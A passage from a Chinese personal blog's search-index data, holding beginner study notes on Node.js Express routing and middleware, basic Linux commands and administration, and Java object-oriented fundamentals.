","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:1","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 监听 GET/POST 请求app.get()/app.post()方法，可以监听客户端 GET/POST 请求 app.get('请求URL',function(req)) //客户端请求的 URL 地址 // 请求对应的处理函数 // req: 请求对象 // res: 响应对象 app.get(\"/welcome\",(req,res)=\u003e{ res.send(\"Hello World\") }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:2","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 获取 URL 中携带的查询参数通过req.query对象，可以放问到客户端通过查询字符串的形式，发送到服务器的参数 app.get('/',(req.res)=\u003e{ // req.query 默认是一个空对象 // 客户端使用?name=zs\u0026age=20 // 可以通过 req.query 对象访问到 // req.query.name req.query.age console.log(req.query) }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:3","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 获取 URL 中的动态参数通过req.params对象，可以访问到 URL 中，通过:匹配到的动态参数 app.get('/user/:id',(req,res)=\u003e{ //req.params 里面存放着通过:动态匹配到的参数值 console.log(req.params) }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:4","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 托管静态资源express.static() express提供了一个static()函数，创建一个静态资源服务器 例如，通过如下代码可以将public目录下的图片、css 文件、js 文件对外开放访问了 app.use(express.static('public')) 挂载路径前缀如果希望托管在静态资源访问路径之前，挂载路径前缀 app.use('/public',express.static('public')) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:5","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" nodemon使用npm install -h nodemon 能够实时监听代码修改 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:6","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 路由express中的路由分 3 部分组成，分别是请求的类型、请求的 URL 地址、处理函数 app.METHOD(PATH,HANDLER) app.get(\"/\",(req.res)=\u003e{ res.send(\"Hello World\") })sss app.post(\"/\",(req,res)=\u003e{ res.send(\"Hello Worlds\") }) 模块化将路由抽离为单独的模块 创建路由模块对应的 js 文件 调用express.Router()函数创建路由对象 向路由对象上挂载具体的路由 使用module.exports向外共享路由的对象 使用app.use()函数注册路由模块 创建路由模块 var express = require(\"express\") var router = express.Router router.get('/user/list',(req,res)=\u003e{ res.send(\"Get user list\") }) router.post('/user/add',(req,res)=\u003e{ res.send('Add new user.') }) module.exports = router 注册路由模块 const userRouter = require(\"./route.js\") app.use(userRouter) app.use()函数的作用，就是来注册全局中间件 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:7","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 中间件当一个请求到达 Express 的服务器之后，可以连续调用多个中间件，从而对这次请求进行预处理 客户端发起的任何请求，到达服务器之后，都会触发的中间件，叫做全局生效的中间件 通过调用app.use(中间件函数)，即可定义全局生效的中间件函数 最简单的中间件函数 const mw = function(req,res,next){ console.log('中间件函数') next() } 局部生效的中间件，不使用 app.use() 定义的中间件 const mw = function(req,res,next){ console.log('中间件函数') next() } app.get('/',mw,function(req,res){ res.send(\"Hello World\") }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:8","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["运维"],"content":" 开关机shutdown关机 sync # 将数据由内存同步到硬盘中 shutdown # 关机指令 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:1:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 系统目录架构1、一切皆文件 2、根目录/，所有的文件都挂载在这个节点下 目录解释 /bin # bin是 binary 的缩写，这个目录存放着最常使用的命令 /boot # 这里存放的是启动Linux时使用的一些核心文件，包括一些连接以及镜像文件 /dev # dev是device的缩写，存放的是Linux的外部设备，在Linux中方问设备的方式和访问文件的方式是相同的 /etc # 这个目录用来存放所有的系统管理所需要的配置文件和子目录 /home # 用户的主目录，在linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的 /lib # 这个目录存放着系统最基本的动态连接共享库 /proc # 这个目录是一个虚拟的目录，他是系统内存的映射，我们可以直接访问这个目录来获取系统信息 /root # 系统管理员的目录 /usr # 用户的很多应用程序和文件都存在这个目录下 /usr/bin # 系统用户使用的应用程序 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:2:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 常用的基本命令","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 目录管理 cd / # 切换到根目录 绝对路径 cd ../ #切换到上一级目录 相对路径 ls # 列出目录 -a # all 查看全部文件，包括隐藏文件 -l # 列出所有文件，包括属性 pwd # 显示当前所在的目录 mkdir #创建目录 -p # 创建多级目录 rmdir #删除目录 仅能删除空的目录 rmdir -p # 删除多级目录 cp # 复制文件或者目录 cp oldfile newfile rm # 移除文件或者目录 -f # 忽略不存在的文件，不会出现警告，强制删除 -r # 递归删除 mulu -i # 互动，删除询问是否删除 mv # 移动文件或者目录 / 重命名文件 -f # 强制移动 -u # 只替换已经更新过的文件 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:1","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 基本属性 f10wers13eicheng@MacBookPro [21时49分24秒] [~/Desktop/题目] -\u003e % ls -l total 8 drwxr-xr-x 3 f10wers13eicheng staff 96 2 2 00:17 assets drwxr-xr-x 6 f10wers13eicheng staff 192 2 2 00:20 deploy -rw-r--r--@ 1 f10wers13eicheng staff 2974 2 2 00:22 writeup.md // d 是目录 // - 是文件 // I 是链接文档 // b 是配置文件里面的可供存储的接口设备 // c 是配置文件里面的串行端口设备，例如键盘、鼠标等 // 接下来的字符中，以三个为一组，且均为[rwx]的三个参数组合 // 其中r代表可读 w代表可写 x代表可执行 // 如果没有权限，则会出现\"-\" ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:2","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 修改文件属性chgrp 更改文件属性 chgrp [-R] 属组名 文件名 -R递归更改文件属组 chown更改文件属主，也可以同时更改文件属组 chown [-R] 属主名 文件名 chown [-R] 属主名:属组名 文件名 chmod [-R] xyz 文件/目录 r:4 w:2 x:1 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:3","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 文件内容查看 cat #由第一行开始显示文件内容 tac #由最后一行开始显示 nl #显示的时候，顺道输出行号 more #一页页的显示文件内容 less #可以往前翻页，其他与 more 相似 head #只看头几行 tail #只看尾巴几行 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:4:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux 链接概念Linux 链接分为两种 硬链接、软连接 硬链接 A—B 假设 B 是 A 的硬链接，那么他们两个指向了同一个文件，允许一个文件拥有多个路径。 软连接 类似 Windows 下的快捷方式，删除源文件，快捷方式也访问不了 创建链接命令 ln ln -s file link #软连接 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:5:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux账号管理添加用户 useradd 选项 用户名 -m 自动创建这个用户的主目录 -G 指定用户组 删除用户 userdel -r 用户名 -r 删除目录 修改用户 usermod 选项 用户名 切换用户 su username ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:6:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux用户组管理/etc/group 创建一个用户组 groupadd 组名 -g id 指定id 删除用户组 groupdel 组名 修改用户组的权限和信息 groupmod -g id -n newname oldname 用户切换用户组 # 登录当前用户 # newgrp root ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:7:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux磁盘管理df列出文件系统整体的磁盘使用量 du检查磁盘空间使用量 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:8:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux进程管理在 Linux 中，每一个程序都是有自己的一个进程，每一个进程都有一个 id 号 每一个进程，都会有一个父进程 ps 查看当前系统中正在进行的各种进程信息 -a 显示当前终端运行的所有的进程信息 -u 以用户的信息显示进程 -x 显示后台运行进程的参数 ps -ef 可以查看到父进程的信息 pstree -pu -p 显示父id -u 显示用户组 杀掉进程 kill -9 pid 强制杀掉进程 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:9:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" for each循环for(variable:collection)statement eg public class Main { public static void main(String[] args) { int[] a = new int[100]; for(int i = 0;i\u003c100;i++){ a[i] = i; } for(int element:a) System.out.println(element); } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:0:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 数组初始化以及匿名数组int[] smallPrimes = {2,3,5,7,11,13}; new int[] {17.19.20}; 对象与类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:0:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 使用预定义类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:1:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 对象与对象变量new Date Date类中有一个toString方法，这个方法将返回日期的字符串描述 String s = new Date.toString() 在这两个例子中，构造的对象仅使用了一次，通常，希望构造的对象可以多次使用，因此，需要讲对象存放在一个变量中 Date birthday = new Date(); 在对象与对象变量之间存在着一个重要的区别 Date deadline 定义了一个对象变量deadline，它可以引用Date 类型的对象。但是，一定要认识到：变量deadline不是一个对象，实际上也没有引用对象。此时，不能将任何Date 方法应用于这个变量上。语句 s = deadline.toString(); // not yet 必须首先初始化变量deadline，这里有两个选择。当然，可以用新够早的对象初始化这个变量 deadline = new Date(); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:1:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 用户自定义类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" Employee类 import java.time.LocalDate; public class Employee { public static void main(String[] args) { Employee[] staff = new Employee[3]; staff[0] = new Employee(\"Tom\",1000,1987,12,15); staff[1] = new Employee(\"Jim\",2000,1988,12,15); staff[2] = new Employee(\"Helen\",3000,1989,12,15); for(Employee e : staff) e.raiseSalary(5); for(Employee e : staff) System.out.println(\"name=\"+e.getName()+\",salary=\"+ e.getSalary()+\",hireDay=\"+ e.getHireDay()); } private String name; private double salary; private LocalDate hireDay; // constructor public Employee(String n,double s,int year,int month,int day){ name = n; salary = s; hireDay = LocalDate.of(year,month,day); } // method public String getName(){ return name; } public double getSalary(){ return salary; } public LocalDate getHireDay(){ return hireDay; } public void raiseSalary(double byPercent){ double raise = salary * byPercent / 100; salary += raise; } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 从构造器开始 public Employee(String n,double s,int year,int month,int day){ name = n; salary = s; LocalDate hireDay = LocalDate.of(year,month,day); } 可以看到构造器与类同名。在构造Employee类的对象时，构造器会运行，以便将实例域初始化所希望的状态 构造器与其他的方法有一个重要的不同。构造器总是伴随着new操作符的执行被调用，而不能对一个已经存在的方法调用构造器来达到重新设置实例域的目的。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" final实例域可以将实例域定义为 final。构造对象时必须初始化这样的域。也就是说，必须确保在每一个构造器执行之后，这个域的值被设置，并且在后面的操作中，不能够再对它进行修改。例如，可以将Employee类中的 name 域声明为 final，因为在对象构建之后，这个值不会再被修改，即没有setName方法。 class Employee{ private final String name; } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态域与静态方法在前面给出的示例程序中，main方法都被标记为static修饰符。下面讨论一下这个修饰符 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态域如果将域定义为 static，每个类中只有一个这样的域。而每一个对象对于所有的实例域却都有自己的一份拷贝。例如，假定需要给每一个雇员赋予唯一的标识码。这里给Employee 类添加一个实例域id和一个静态域netxId; class Employee{ private static int nextId = 1; private int id; } 现在，每一个雇员对象都有一个自己的id域，但这个类的所有实例将共享一个 nextId域。换句话说，如果有 1000 个Employee类的对象，则有1000个实例域 id。但是，只有一个静态域nextId。即使没有一个雇员对象，静态域netxtId也存在。它属于类，而不属于任何独立的对象。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态常量例如 public class Math{ public static final double PI = 3.1415926585; } 在程序中，可以才用Math.PI的形式获得这个常量 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态方法静态方法是一种不能向对象实施操作的方法，例如Math 类的pow方法就是一个静态方法 Math.pow(x,a) 计算 x 的 a 次方 main 方法也是就一个静态方法 public class Application{ public static void main(String args[]){ //constructor objects here } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 对象构造","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 重载有些类有多个构造器。例如，可以构造如下一个空的StringBuilder 对象 StringBuilder messages = new StringBuilder() 或者，可以指定一个初始化字符串 StringBuilder todoList = new StringBuilder(\"To do\"); 这种特征叫做重载。如果多个方法有相同的名字、不同的参数，便产生了重载。编译器必须挑出具体执行哪个方法，它通过用各个方法给出的参数类型与特定方法调用所使用的值类型进行匹配来挑选出相应的方法。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 初始化块在构造器中设置值 在声明中赋值 实际上，Java 还有第三种机制，称为初始化块。在一个类的声明中可以包含多个代码快。只要构造类的对象，这些块就会被执行。例如 class Employee{ private static int nextId; private int id; private String name; private double salary; { id = nextId; nextId++ } public Employee(String n,double s){ name = n; salary = s; } public Employee(){ name=\"\"; salary= 0; } } 在这个示例中，无论是用哪个构造器构造对象，id 域都在对象初始化块中被初始化。先运行初始化块，然后才运行构造器的主体部分。 这种机制是不必需的，也不常见。通常会直接将初始化代码放在构造器中。 如果对类的静态域进行初始化的代码比较复杂，那么可以使用静态的初始化块。 将代码放在一个块中，并标记关键字 static。下面是一个示例。其功能是将雇员ID的起始值赋予一个小于 10000 的随机整数 static{ Random generator = new Random(); nextId = generator.nextInt(10000); } 在类第一次加载的时，将会进行静态域的初始化。与实例域一样，除非将它们显示地设置成其他值，否则默认的初始化值是 0、false、或null。所有静态初始化语句以及静态初始化块都将依照类定义的顺序执行。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 对象析构与 finalize方法如果某个资源需要在使用完毕后立刻被关闭， 那么就需要由人工来管理。对象用完时， 可以应用一个 close 方法来完成相应的清理操作。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 包","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:5:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 类的导入一个类可以使用所属包中所有的类，以及其他包中的公有类。我们可以采用两种方式访问另一个包中的公有类。第一种方式是在每个类名之前添加完整的包名。 例如 java.time.LocalDate today = java.time.LocalDate.now(); 这很繁琐。更简单常用的方式是使用import语句。import语句是一种引用包含在包中的类的简单描述。一旦使用了import语句，在使用类时，就不必写出包的全名了。 可以使用 import 语句导入一个特定的类或者整个包。import语句应该位于源文件的顶部(但位于 package 语句的后面)。例如，可以使用下面这条语句导入java.util包中所有的类。 import java.util.* 然后，就可以使用 LocalDate today = LocalDate.now() 继承","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:5:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 类、超类和子类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 定义字类继承Employee类来定义Manager类的格式，关键字 extends 表示继承。 public class Manager extends Employee{ } 关键字extends表明正在构造的新类派生于一个已存在的类。已存在的类称为超类(superclass)、基类(base class)或者父类(parent class)；新类称为字类(subclass)、派生类(derived class)。超类和子类是Java 程序员最常用的两个属于， 尽管Employee类是一个超类，但并不是因为它优于子类或者拥有比子类更多的功能。而恰恰相反，子类拥有比父类更丰富的功能。 在Manager类中，增加了一个用于存储奖金信息的域，以及一个用于设置这个域的新方法 public class Manager extends Employee{ private double bonus; public void setBonus(double bonus){ this.bonus = bonus; } } 这里定义的方法和域并没有什么特别之处。如果有一个Manger 对象，就可以使用 setBonus 方法 当然，由于setBonus方法不是在Employee类中定义的，所以属于Employee类的对象不能使用 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 覆盖方法然而，超类中的有些方法对字类Manager并不一定适用。具体来说，Manager类中的getSalary方法应该返回薪水和奖金的总和。为此，需要提供一个新的方法来覆盖超类中的这个方法 这里主要是利用super去调用父类中private作用域的getSalary方法 public double getSalary(){ double baseSalary = super.getSalary(); return baseSalary + bonus; } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 子类构造器在例子的最后，我们来提供一个构造器 public Manager(String n,double s,int year,int month,int day){ super(n，s,year,month,day); bonus = 0; } 这里的关键字super具有不同的含义。语句 super(n,s,year,year,month,day) 是调用超类Employee中含有n,s,year,month,day的参数构造器的简写形式 由于Manger类的构造器不能访问Employee类的私有域，所以必须利用Employee类的构造器对这部分私有域进行初始化，我们可以通过 super 来实现对超类构造器的调用。使用super调用构造器的语句必须是子类构造器的第一条语句 如果子类的构造器没有显式地调用超类的构造器，则将自动地调用超类默认(没有参数)的构造器。如果超类没有不带参数的构造器，并且在子类构造其中又没有显式地调用超类的其他构造器，则Java 编译器则报告错误 编写一个demo Manager boss = new Manager(\"Tom\",8000,1988,12,15); boss.setBonus(1000); Employee[] staff = new Employee[3]; staff[0] = boss; staff[1] = new Employee(\"Jim\",1000,1985,12,16); staff[2] = new Employee(\"Lara\",1000,1985,12,16); for(Employee e:staff) System.out.println(\"name=\"+e.getName()+\"salary=\"+e.getSalary()); 需要关注的是e.getSalary() 调用能够确定应该执行哪个getSalary方法。请注意，尽管这里将e声明为Employee类型，但实际上 e 既可以引用Employee 类型的对象，也可以引用Manger 类型的对象。 当 e 引用 Employee 对象时， e.getSalary( ) 调用的是 Employee 类中的 getSalary 方法; 当 e 引用 Manager 对象时， e.getSalary( ) 调用的是 Manager 类中的 getSalary 方法。 虚拟机知道 e 实际引用的对象类型， 因此能够正确地调用相应的方法。 一个对象变量(例如， 变量 e) 可以指示多种实际类型的现象被称为多态(polymorphism)。 在运行时能够自动地选择调用哪个方法的现象称为动态绑定(dynamic binding。) ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 继承 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:4","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 多态 Employee e; e = new Employee(. . .); // Employee object expected e = new Manager(. . .); // OK, Manager can be used as well 在Java 程序语言设计中，对象变量是多态的。一个Employee变量既可以引用Employee 类对象，也可以引用一个Employee 类的任何一个子类的对象 置换法则 Manager boss = new Manager(. . .); Employee[] staff = new Employee[3]; staff[0] = boss; 在这个例子中，变量 staff[0]与boss引用同一个对象。但编译器将 staff[0]看成Employee对象。 这意味着，可以这样调用 boss.setBonus(5000); //OK 但不能这样调用 staff[0].setBonus(5000) //Error 这是因为staff[0]声明的类型是Employee，而setBonus 不是Employee 类的方法 然而，不能将一个超类的引用赋给子类变量。例如，下面的赋值是非法的。 Manager m = staff[i] //Error ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:5","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 阻止继承 ：final 类和方法如果不希望Executive有子类，那么需要在前面加上 final 来修饰 public final class Executive extends Manger{} 类中的特定方法也可以被声明为final。如果这样做，字类就不能覆盖这个方法 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:6","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 强制类型转换Java 中提供了一种专门用于进行类型转换的表示法 double x = 3.4; int nx = (int) x; 对象引用的转换方法与数值表达式的类型转换类似，仅需要一对圆括号将目标类名括起来，并放置在需要转换的对象引用之前就可以了。例如： Manager boss = (Manager) staff[0]; 只能在继承层次内进行类型转换 在将超类转换成子类之前，应该使用instanceof进行检查 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:7","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 抽象类使用abstract关键字，定义抽象类 public abstract String getDescription(); // no implementation required 为了提高程序的清晰度，包含一个或多个抽象方法的类本身必须被声明为抽象的。 public abstract class Person{ public abstract String getDescription(); } 除了抽象方法之外，抽象类还可以包含具体数据和具体方法。例如，Person 类还保存着姓名和一个返回姓名的具体方法 public abstract class Person{ private String name; public Person(String name){ this.name = name; } public abstract String getDescription(); public String getName(){ return name; } } 抽象方法充当着占位的角色，它们的具体实现在子类中。扩展抽象类可以有两种选择。一种是在抽象类中定义部分抽象类方法或不定义抽象类方法，这样就必须将子类也标记为抽象类，另一种是定义全部的抽象方法，这样一来，子类就不是抽象的了。 写一个Demo Main.java public class Main { public static void main(String[] args) { Person[] people = new Person[2]; people[0] = new Student(\"Jim\"); people[1] = new Employee(\"Tom\"); for(Person p:people) System.out.println(\"This is description:\"+p.getDescription()); } } Employee.java public class Employee extends Person{ private String name; // constructor public Employee(String n){ super(n); } // method public String getDescription(){ return \"I'm a Employee\"; } } Student.java public class Student extends Person{ public Student(String name){ super(name); } public String getDescription(){ return \"I'm a Student\"; } } p.getDescription()这里不是调用了一个没有定义的方法吗？由于不能构造抽象类Person 的对象，所以变量 p永远不会引用Person 对象，而是引用诸如Employee或者Student 这样的具体子类对象，而这些对象中都定义了getDescription方法 4个访问修饰符 仅对本类可见-private 对所有类可见-public 对本包和所有子类可见-protected 对本包可见-默认，不需要修饰符 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:8","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" Object：所有类的超类Object 类是Java 中所有类的始祖，在Java 中每个类都是由它扩展而来的。但是并不需要这样写 public class Employee extends Object 如果没有明确地指出超类，Object 就被认为是这个类的超类。由于在Java 中，每个类都是由Object 类扩展而来的，所以，熟悉这个类提供的所有服务十分重要。 可以使用Object类型的变量引用任何类型的对象: Object obj = new Employee(\"Jim\",10000); 当然，Object 类型的变量只能用于作为各种值的通用持有者。要想对其中的内容进行具体的操作，还需要清楚对象的原始类型，并进行相应的类型转换： Employee e = (Employee) obj; 在Java 中，只有基本类型(primitive types)不是对象，例如，数字、字符和布尔类型的值都不是对象。 所有数组类型，不管是对象数组还是基本类型的数组都扩展了Object类。 Employee[] staff = new Employee[10]; obj = staff;//ok obj = new int[10]; //ok ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" equals方法Object类中的equals方法用于检测一个对象是否等于另一个对象。在Object类中，这个方法将判断两个对象是否具有相同的引用。如果两个对象具有相同的引用，它们一定是相等的。从这点上看，将其作为默认操作也是合乎情理的。然而，对于多数类来说，这种判断并没有什么意义。例如，采用这种方式比较两个PrintStram对象是否想等就完全没有意义。然而，经常需要检测两个对象状态的相等性，如果两个对象的状态相等，就认为这两个对象是相等的。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" hashCode 方法散列码(hash code)是由对象导出的一个整型值。散列码是没有规律的。如果 x 和 y 是两个不同的对象，x.hashCode()与y.hashCpde()基本上不会相同。 String 类使用下列算法计算散列码 int hash = 0; for(int i = 0;i \u003c length();i++) hash = 31*hash + charAt(i); 由于hashCode方法定义在Object 类中，因此每个对象都有一个默认的散列码，其值为对象的存储地址。来看下面这个例子。 String s = \"Ok\"; StringBuilder sb = new StringBuilder(s); System.out.println(s.hashCode()+\" \"+sb.hashCode()); String t = new String(\"Ok\"); StringBuilder tb = new StringBuilder(t); System.out.println(t.hashCode()+ \" \" +tb.hashCode()); 字符串 t 和 s 拥有相同的散列码，这是因为字符串的散列码是由内容导出的。而字符串缓冲 sb 与 tb 却有着不同的散列码，这是因为在StringBuffer 类中没有定义 hashCode 方法，它的散列码是由Object 类的默认 hashCode 方法导出的对象存储地址。 如果重新定义 equals 方法，就必须重新定义 hashCode 方法，以便用户可以将对象插入到散列表中。 hashCode 方法应该返回一个整型数值，并合理地组合实例域的散列码，以便能够让各个不同的对象产生的散列码更加均匀。 public class Employee{ public int hashCode(){ return 7*name.hashCode() +11*new Double(salary).hashCode() +13*hireDay.hashCode(); } } 不过，还可以做得更好。首先，最好是用 null 安全的方法Object.hashCode。如果其参数为 null，这个方法会返回 0，否则返回对参数调用 hashCode 的结果。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" toString方法在Object 